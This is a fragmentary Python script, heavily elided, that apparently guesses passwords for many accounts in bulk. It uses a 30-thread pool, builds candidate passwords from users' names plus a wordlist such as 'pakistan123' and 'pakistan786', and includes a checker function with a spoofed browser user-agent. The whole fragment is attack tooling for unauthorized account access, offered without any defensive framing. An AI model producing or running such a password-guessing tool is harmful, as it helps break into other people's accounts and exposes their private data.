...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['pakistan','pakistan1','pakistan12','pakistan123','pakistan1234','pakistan12345','pakistan786','pakistan123456']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.3'
